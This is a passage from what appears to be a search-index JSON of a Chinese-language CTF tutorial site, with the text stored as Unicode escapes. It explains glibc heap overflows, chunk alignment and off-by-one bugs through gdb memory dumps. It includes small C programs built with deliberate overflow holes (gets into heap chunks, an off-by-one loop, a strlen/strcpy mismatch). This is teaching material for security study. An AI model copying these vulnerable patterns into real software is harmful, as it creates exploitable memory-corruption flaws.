\u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002\n\u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002", 
            "title": "\u5806\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_1", 
            "text": "", 
            "title": "\u5806\u6ea2\u51fa"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_2", 
            "text": "\u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08 \u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570 \uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230 \u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740 \u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002  \u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f   \u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002  \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002   \u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002  \u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f   \u8986\u76d6\u4e0e\u5176 \u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk  \u7684\u5185\u5bb9\u3002  prev_size  size\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002  NON_MAIN_ARENA   IS_MAPPED    PREV_INUSE   the True chunk size    chunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002    \u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_3", 
            "text": "\u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a  #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n}  \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002 0x602000:   0x0000000000000000  0x0000000000000021  ===chunk\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  ===top chunk\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000 \nprint 'A'*100\n\u8fdb\u884c\u5199\u5165 0x602000:   0x0000000000000000  0x0000000000000021  ===chunk\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x4141414141414141  ===top chunk(\u5df2\u88ab\u6ea2\u51fa)\n0x602030:   0x4141414141414141  0x4141414141414141\n0x602040:   0x4141414141414141  0x4141414141414141", 
            "title": "\u57fa\u672c\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_4", 
            "text": "\u5806\u6ea2\u51fa\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:", 
            "title": "\u5c0f\u603b\u7ed3"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_5", 
            "text": "\u901a\u5e38\u6765\u8bf4\u5806\u662f\u901a\u8fc7\u8c03\u7528 glibc \u51fd\u6570 malloc \u8fdb\u884c\u5206\u914d\u7684\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u4f1a\u4f7f\u7528 calloc \u5206\u914d\u3002calloc \u4e0e malloc \u7684\u533a\u522b\u662f  calloc \u5728\u5206\u914d\u540e\u4f1a\u81ea\u52a8\u8fdb\u884c\u6e05\u7a7a\uff0c\u8fd9\u5bf9\u4e8e\u67d0\u4e9b\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e\u7684\u5229\u7528\u6765\u8bf4\u662f\u81f4\u547d\u7684 \u3002  calloc(0x20);\n//\u7b49\u540c\u4e8e\nptr=malloc(0x20);\nmemset(ptr,0,0x20); \n\u9664\u6b64\u4e4b\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u5206\u914d\u662f\u7ecf\u7531 realloc \u8fdb\u884c\u7684\uff0crealloc \u51fd\u6570\u53ef\u4ee5\u8eab\u517c malloc \u548c free \u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u3002 #include  stdio.h \n\nint main(void) \n{\n  char *chunk,*chunk1;\n  chunk=malloc(16);\n  chunk1=realloc(chunk,32);\n  return 0;\n} \nrealloc\u7684\u64cd\u4f5c\u5e76\u4e0d\u662f\u50cf\u5b57\u9762\u610f\u4e49\u4e0a\u90a3\u4e48\u7b80\u5355\uff0c\u5176\u5185\u90e8\u4f1a\u6839\u636e\u4e0d\u540c\u7684\u60c5\u51b5\u8fdb\u884c\u4e0d\u540c\u64cd\u4f5c   \u5f53realloc(ptr,size)\u7684size\u4e0d\u7b49\u4e8eptr\u7684size\u65f6  \u5982\u679c\u7533\u8bf7size \u539f\u6765size  \u5982\u679cchunk\u4e0etop chunk\u76f8\u90bb\uff0c\u76f4\u63a5\u6269\u5c55\u8fd9\u4e2achunk\u5230\u65b0size\u5927\u5c0f  \u5982\u679cchunk\u4e0etop chunk\u4e0d\u76f8\u90bb\uff0c\u76f8\u5f53\u4e8efree(ptr),malloc(new_size)     \u5982\u679c\u7533\u8bf7size \u539f\u6765size  \u5982\u679c\u76f8\u5dee\u4e0d\u8db3\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk(64\u4f4d\u4e0b32\u4e2a\u5b57\u8282\uff0c32\u4f4d\u4e0b16\u4e2a\u5b57\u8282)\uff0c\u5219\u4fdd\u6301\u4e0d\u53d8  \u5982\u679c\u76f8\u5dee\u53ef\u4ee5\u5bb9\u5f97\u4e0b\u4e00\u4e2a\u6700\u5c0fchunk\uff0c\u5219\u5207\u5272\u539fchunk\u4e3a\u4e24\u90e8\u5206\uff0cfree\u6389\u540e\u4e00\u90e8\u5206      \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8e0\u65f6\uff0c\u76f8\u5f53\u4e8efree(ptr)  \u5f53realloc(ptr,size)\u7684size\u7b49\u4e8eptr\u7684size\uff0c\u4e0d\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c", 
            "title": "\u5bfb\u627e\u5806\u5206\u914d\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_6", 
            "text": "\u901a\u8fc7\u5bfb\u627e\u5371\u9669\u51fd\u6570\uff0c\u6211\u4eec\u5feb\u901f\u786e\u5b9a\u7a0b\u5e8f\u662f\u5426\u53ef\u80fd\u6709\u5806\u6ea2\u51fa\uff0c\u4ee5\u53ca\u6709\u7684\u8bdd\uff0c\u5806\u6ea2\u51fa\u7684\u4f4d\u7f6e\u5728\u54ea\u91cc\u3002  \u5e38\u89c1\u7684\u5371\u9669\u51fd\u6570\u5982\u4e0b   \u8f93\u5165  gets\uff0c\u76f4\u63a5\u8bfb\u53d6\u4e00\u884c\uff0c\u5ffd\u7565  '\\x00'  scanf  vscanf    \u8f93\u51fa  sprintf    \u5b57\u7b26\u4e32  strcpy\uff0c\u5b57\u7b26\u4e32\u590d\u5236\uff0c\u9047\u5230  '\\x00'  \u505c\u6b62  strcat\uff0c\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u9047\u5230  '\\x00'  \u505c\u6b62  bcopy", 
            "title": "\u5bfb\u627e\u5371\u9669\u51fd\u6570"
        }, 
        {
            "location": "/pwn/heap/heapoverflow_basic/#_7", 
            "text": "\u8fd9\u4e00\u90e8\u5206\u4e3b\u8981\u662f\u8ba1\u7b97 \u6211\u4eec\u5f00\u59cb\u5199\u5165\u7684\u5730\u5740\u4e0e\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u4e4b\u95f4\u7684\u8ddd\u79bb \u3002\n\u4e00\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u662fmalloc\u7684\u53c2\u6570\u7b49\u4e8e\u5b9e\u9645\u5206\u914d\u5806\u5757\u7684\u5927\u5c0f\uff0c\u4f46\u662f\u4e8b\u5b9e\u4e0a ptmalloc \u5206\u914d\u51fa\u6765\u7684\u5927\u5c0f\u662f\u5bf9\u9f50\u7684\u3002\u8fd9\u4e2a\u957f\u5ea6\u4e00\u822c\u662f\u5b57\u957f\u76842\u500d\uff0c\u6bd4\u598232\u4f4d\u7cfb\u7edf\u662f8\u4e2a\u5b57\u8282\uff0c64\u4f4d\u7cfb\u7edf\u662f16\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u5bf9\u4e8e\u4e0d\u5927\u4e8e2\u500d\u5b57\u957f\u7684\u8bf7\u6c42\uff0cmalloc\u4f1a\u76f4\u63a5\u8fd4\u56de2\u500d\u5b57\u957f\u7684\u5757\u4e5f\u5c31\u662f\u6700\u5c0fchunk\uff0c\u6bd4\u598264\u4f4d\u7cfb\u7edf\u6267\u884c malloc(0) \u4f1a\u8fd4\u56de\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5757\u3002  #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(0);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n}  //\u6839\u636e\u7cfb\u7edf\u7684\u4f4d\u6570\uff0cmalloc\u4f1a\u5206\u914d8\u621616\u5b57\u8282\u7684\u7528\u6237\u7a7a\u95f4\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u6ce8\u610f\u7528\u6237\u533a\u57df\u7684\u5927\u5c0f\u4e0d\u7b49\u4e8e chunk_hear.size\uff0cchunk_hear.size=\u7528\u6237\u533a\u57df\u5927\u5c0f+2*\u5b57\u957f  \u8fd8\u6709\u4e00\u70b9\u662f\u4e4b\u524d\u6240\u8bf4\u7684\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4f1a\u88ab\u4fee\u6539\uff0c\u5176\u6709\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e0e\u5176\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\u50a8\u5b58\u5185\u5bb9\u3002\u56de\u5934\u518d\u6765\u770b\u4e0b\u4e4b\u524d\u7684\u793a\u4f8b\u4ee3\u7801 #include  stdio.h \n\nint main(void) \n{\n  char *chunk;\n  chunk=malloc(24);\n  puts( Get input: );\n  gets(chunk);\n  return 0;\n} \n\u89c2\u5bdf\u5982\u4e0a\u4ee3\u7801\uff0c\u6211\u4eec\u7533\u8bf7\u7684chunk\u5927\u5c0f\u662f24\u4e2a\u5b57\u8282\u3002\u4f46\u662f\u6211\u4eec\u5c06\u5176\u7f16\u8bd1\u4e3a64\u4f4d\u53ef\u6267\u884c\u7a0b\u5e8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5206\u914d\u7684\u5185\u5b58\u4f1a\u662f16\u4e2a\u5b57\u8282\u800c\u4e0d\u662f24\u4e2a\u3002 0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1 \n16\u4e2a\u5b57\u8282\u7684\u7a7a\u95f4\u662f\u5982\u4f55\u88c5\u5f97\u4e0b24\u4e2a\u5b57\u8282\u7684\u5185\u5bb9\u5462\uff1f\u7b54\u6848\u662f\u501f\u7528\u4e86\u4e0b\u4e00\u4e2a\u5757\u7684pre_size\u57df\u3002\u6211\u4eec\u53ef\u6765\u770b\u4e00\u4e0b\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0eglibc\u4e2d\u5b9e\u9645\u5206\u914d\u7684\u5185\u5b58\u5927\u5c0f\u4e4b\u95f4\u7684\u8f6c\u6362\u3002  /* pad request bytes into a usable size -- internal version */  //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1  #define request2size(req)                                                      \\      (((req) + SIZE_SZ + MALLOC_ALIGN_MASK   MINSIZE)                           \\           ? MINSIZE                                                             \\           : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK)   ~MALLOC_ALIGN_MASK)   \u5f53req=24\u65f6\uff0crequest2size(24)=32\u3002\u800c\u9664\u53bbchunk \u5934\u90e8\u768416\u4e2a\u5b57\u8282\u3002\u5b9e\u9645\u4e0a\u7528\u6237\u53ef\u7528chunk\u7684\u5b57\u8282\u6570\u4e3a16\u3002\u800c\u6839\u636e\u6211\u4eec\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u53ef\u4ee5\u77e5\u9053chunk\u7684pre_size\u4ec5\u5f53\u5b83\u7684\u524d\u4e00\u5757\u5757\u5904\u4e8e\u91ca\u653e\u72b6\u6001\u65f6\u624d\u8d77\u4f5c\u7528\u3002\u6240\u4ee5\u7528\u6237\u8fd9\u65f6\u5019\u5176\u5b9e\u8fd8\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2achunk\u7684prev_size\u5b57\u6bb5\uff0c\u6b63\u597d24\u4e2a\u5b57\u8282\u3002 \u5b9e\u9645\u4e0a ptmalloc \u5206\u914d\u5185\u5b58\u662f\u4ee5\u53cc\u5b57\u4e3a\u57fa\u672c\u5355\u4f4d\uff0c\u4ee564\u4f4d\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5206\u914d\u51fa\u6765\u7684\u7a7a\u95f4\u662f16\u7684\u6574\u6570\u500d\uff0c\u5373\u7528\u6237\u7533\u8bf7\u7684chunk\u90fd\u662f16\u5b57\u8282\u5bf9\u9f50\u7684\u3002", 
            "title": "\u786e\u5b9a\u586b\u5145\u957f\u5ea6"
        }, 
        {
            "location": "/pwn/heap/off_by_one/", 
            "text": "\u5806\u4e2d\u7684 Off-By-One\n\n\n\u4ecb\u7ecd\n\n\n\u4e25\u683c\u6765\u8bf4 off-by-one \u6f0f\u6d1e\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0coff-by-one \u6307\u7a0b\u5e8f\u5411\u7f13\u51b2\u533a\u4e2d\u5199\u5165\u65f6\uff0c\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u8fd9\u4e2a\u7f13\u51b2\u533a\u672c\u8eab\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u5e76\u4e14\u53ea\u8d8a\u754c\u4e86\u4e00\u4e2a\u5b57\u8282\u3002\n\n\noff-by-one \u6f0f\u6d1e\u539f\u7406\n\n\noff-by-one \u662f\u6307\u5355\u5b57\u8282\u7f13\u51b2\u533a\u6ea2\u51fa\uff0c\u8fd9\u79cd\u6f0f\u6d1e\u7684\u4ea7\u751f\u5f80\u5f80\u4e0e\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u548c\u5b57\u7b26\u4e32\u64cd\u4f5c\u6709\u5173\uff0c\u5f53\u7136\u4e5f\u4e0d\u6392\u9664\u5199\u5165\u7684 size \u6b63\u597d\u5c31\u53ea\u591a\u4e86\u4e00\u4e2a\u5b57\u8282\u7684\u60c5\u51b5\u3002\u5176\u4e2d\u8fb9\u754c\u9a8c\u8bc1\u4e0d\u4e25\u901a\u5e38\u5305\u62ec\n\n\n\n\n\u4f7f\u7528\u5faa\u73af\u8bed\u53e5\u5411\u5806\u5757\u4e2d\u5199\u5165\u6570\u636e\u65f6\uff0c\u5faa\u73af\u7684\u6b21\u6570\u8bbe\u7f6e\u9519\u8bef(\u8fd9\u5728 C \u8bed\u8a00\u521d\u5b66\u8005\u4e2d\u5f88\u5e38\u89c1)\u5bfc\u81f4\u591a\u5199\u5165\u4e86\u4e00\u4e2a\u5b57\u8282\u3002\n\n\n\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e0d\u5408\u9002\n\n\n\n\n\u4e00\u822c\u6765\u8bf4\uff0c\u5355\u5b57\u8282\u6ea2\u51fa\u88ab\u8ba4\u4e3a\u662f\u96be\u4ee5\u5229\u7528\u7684\uff0c\u4f46\u662f\u56e0\u4e3a Linux \u7684\u5806\u7ba1\u7406\u673a\u5236 ptmalloc \u9a8c\u8bc1\u7684\u677e\u6563\u6027\uff0c\u57fa\u4e8eLinux\u5806\u7684 off-by-one \u6f0f\u6d1e\u5229\u7528\u8d77\u6765\u5e76\u4e0d\u590d\u6742\uff0c\u5e76\u4e14\u5a01\u529b\u5f3a\u5927\u3002\n\u6b64\u5916\uff0c\u9700\u8981\u8bf4\u660e\u7684\u4e00\u70b9\u662f off-by-one \u662f\u53ef\u4ee5\u57fa\u4e8e\u5404\u79cd\u7f13\u51b2\u533a\u7684\uff0c\u6bd4\u5982\u6808\u3001bss \u6bb5\u7b49\u7b49\uff0c\u4f46\u662f\u5806\u4e0a(heap based)\u7684off-by-one \u662f CTF \u4e2d\u6bd4\u8f83\u5e38\u89c1\u7684\u3002\u6211\u4eec\u8fd9\u91cc\u4ec5\u8ba8\u8bba\u5806\u4e0a\u7684 off-by-one \u60c5\u51b5\u3002\n\n\n\u793a\u4f8b1\n\n\nint my_gets(char *ptr,int size)\n{\n    int i;\n    for(i=0;i\n=size;i++)\n    {\n        ptr[i]=getchar();\n    }\n    return i;\n}\nint main()\n{\n    void *chunk1,*chunk2;\n    chunk1=malloc(16);\n    chunk2=malloc(16);\n    puts(\nGet Input:\n);\n    my_gets(chunk1,16);\n    return 0;\n}\n\n\n\n\n\u6211\u4eec\u81ea\u5df1\u7f16\u5199\u7684 my_gets \u51fd\u6570\u5bfc\u81f4\u4e86\u4e00\u4e2aoff-by-one\u6f0f\u6d1e\uff0c\u539f\u56e0\u662ffor\u5faa\u73af\u7684\u8fb9\u754c\u6ca1\u6709\u63a7\u5236\u597d\u5bfc\u81f4\u5199\u5165\u591a\u6267\u884c\u4e86\u4e00\u6b21\uff0c\u8fd9\u4e5f\u88ab\u79f0\u4e3a\u6805\u680f\u9519\u8bef\n\n\n\n\nwikipedia:\n\u6805\u680f\u9519\u8bef\uff08\u6709\u65f6\u4e5f\u79f0\u4e3a\u7535\u7ebf\u6746\u9519\u8bef\u6216\u8005\u706f\u67f1\u9519\u8bef\uff09\u662f\u5dee\u4e00\u9519\u8bef\u7684\u4e00\u79cd\u3002\u5982\u4ee5\u4e0b\u95ee\u9898\uff1a\n\n\n\u5efa\u9020\u4e00\u6761\u76f4\u6805\u680f\uff08\u5373\u4e0d\u56f4\u5708\uff09\uff0c\u957f30\u7c73\u3001\u6bcf\u6761\u6805\u680f\u67f1\u95f4\u76f8\u96943\u7c73\uff0c\u9700\u8981\u591a\u5c11\u6761\u6805\u680f\u67f1\uff1f\n\n\n\n\n\n\u6700\u5bb9\u6613\u60f3\u5230\u7684\u7b54\u684810\u662f\u9519\u7684\u3002\u8fd9\u4e2a\u6805\u680f\u670910\u4e2a\u95f4\u9694\uff0c11\u6761\u6805\u680f\u67f1\u3002\n\n\n\n\n\u6211\u4eec\u4f7f\u7528 gdb \u5bf9\u7a0b\u5e8f\u8fdb\u884c\u8c03\u8bd5\uff0c\u5728\u8fdb\u884c\u8f93\u5165\u524d\u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u4e24\u4e2a\u7528\u6237\u533a\u57df\u4e3a16\u5b57\u8282\u7684\u5806\u5757\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000021 \n=== chunk2\n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\u5f53\u6211\u4eec\u6267\u884c my_gets \u8fdb\u884c\u8f93\u5165\u4e4b\u540e\uff0c\u53ef\u4ee5\u770b\u5230\u6570\u636e\u53d1\u751f\u4e86\u6ea2\u51fa\u8986\u76d6\u5230\u4e86\u4e0b\u4e00\u4e2a\u5806\u5757\u7684 prev_size \u57df\nprint 'A'*17\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x0000000000000041  0x0000000000000021 \n=== chunk2 \n0x602030:   0x0000000000000000  0x0000000000000000\n\n\n\n\u793a\u4f8b2\n\n\n\u7b2c\u4e8c\u79cd\u5e38\u89c1\u7684\u5bfc\u81f4 off-by-one \u7684\u573a\u666f\u5c31\u662f\u5b57\u7b26\u4e32\u64cd\u4f5c\u4e86\uff0c\u5e38\u89c1\u7684\u539f\u56e0\u662f\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u7b26\u8ba1\u7b97\u6709\u8bef\n\n\nint main(void)\n{\n    char buffer[40]=\n;\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\nGet Input\n);\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n\n}\n\n\n\n\n\u7a0b\u5e8f\u4e4d\u770b\u4e0a\u53bb\u6ca1\u6709\u4efb\u4f55\u95ee\u9898(\u4e0d\u8003\u8651\u6808\u6ea2\u51fa)\uff0c\u53ef\u80fd\u5f88\u591a\u4eba\u5728\u5b9e\u9645\u7684\u4ee3\u7801\u4e2d\u4e5f\u662f\u8fd9\u6837\u5199\u7684\u3002\n\u4f46\u662f strlen \u548c strcpy \u7684\u884c\u4e3a\u4e0d\u4e00\u81f4\u5374\u5bfc\u81f4\u4e86off-by-one \u7684\u53d1\u751f\u3002\nstrlen \u662f\u6211\u4eec\u5f88\u719f\u6089\u7684\u8ba1\u7b97 ascii \u5b57\u7b26\u4e32\u957f\u5ea6\u7684\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u65f6\u662f\u4e0d\u628a\u7ed3\u675f\u7b26 \n'\\x00'\n \u8ba1\u7b97\u5728\u5185\u7684\uff0c\u4f46\u662f strcpy \u5728\u590d\u5236\u5b57\u7b26\u4e32\u65f6\u4f1a\u62f7\u8d1d\u7ed3\u675f\u7b26 \n'\\x00'\n \u3002\u8fd9\u5c31\u5bfc\u81f4\u4e86\u6211\u4eec\u5411chunk1\u4e2d\u5199\u5165\u4e8625\u4e2a\u5b57\u8282\uff0c\u6211\u4eec\u4f7f\u7528gdb\u8fdb\u884c\u8c03\u8bd5\u53ef\u4ee5\u770b\u5230\u8fd9\u4e00\u70b9\u3002\n\n\n0x602000:   0x0000000000000000  0x0000000000000021 \n=== chunk1\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000411 \n=== next chunk\n\n\n\n\n\u5728\u6211\u4eec\u8f93\u5165'A'*24\u540e\u6267\u884cstrcpy\n\n\n0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x4141414141414141  0x4141414141414141\n0x602020:   0x4141414141414141  0x0000000000000400\n\n\n\n\n\u53ef\u4ee5\u770b\u5230 next chunk \u7684 size \u57df\u4f4e\u5b57\u8282\u88ab\u7ed3\u675f\u7b26 \n'\\x00'\n \u8986\u76d6\uff0c\u8fd9\u79cd\u53c8\u5c5e\u4e8e off-by-one \u7684\u4e00\u4e2a\u5206\u652f\u79f0\u4e3a NULL byte off-by-one\uff0c\u6211\u4eec\u5728\u540e\u9762\u4f1a\u770b\u5230 off-by-one \u4e0e NULL byte off-by-one \u5728\u5229\u7528\u4e0a\u7684\u533a\u522b\u3002\n\u8fd8\u662f\u6709\u4e00\u70b9\u5c31\u662f\u4e3a\u4ec0\u4e48\u662f\u4f4e\u5b57\u8282\u88ab\u8986\u76d6\u5462\uff0c\u56e0\u4e3a\u6211\u4eec\u901a\u5e38\u4f7f\u7528\u7684CPU\u7684\u5b57\u8282\u5e8f\u90fd\u662f\u5c0f\u7aef\u6cd5\u7684\uff0c\u6bd4\u5982\u4e00\u4e2aDWORD\u503c\u5728\u4f7f\u7528\u5c0f\u7aef\u6cd5\u7684\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u50a8\u5b58\u7684\n\n\nDWORD 0x41424344\n\u5185\u5b58  0x44,0x43,0x42,0x41\n\n\n\n\n\u5c0f\u603b\u7ed3\n\n\n\u4e0a\u9762\u7684\u793a\u4f8b\u5176\u5b9e\u4e5f\u5c55\u793a\u4e86\u5bfb\u627e off-by-one \u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u51e0\u4e2a\u6b65\u9aa4:\n\n\n\u6ce8\u610f\u5faa\u73af\u8fb9\u754c\n\n\n\u5728\u8fdb\u884c\u8bf8\u5982\u5faa\u73af\u5199\u5165\u7684\u64cd\u4f5c\u65f6\uff0c\u8981\u7279\u522b\u6ce8\u610f\u5faa\u73af\u7684\u6b21\u6570\u662f\u5426\u5b58\u5728\u8fb9\u754c\u95ee\u9898\u5bfc\u81f4\u7684 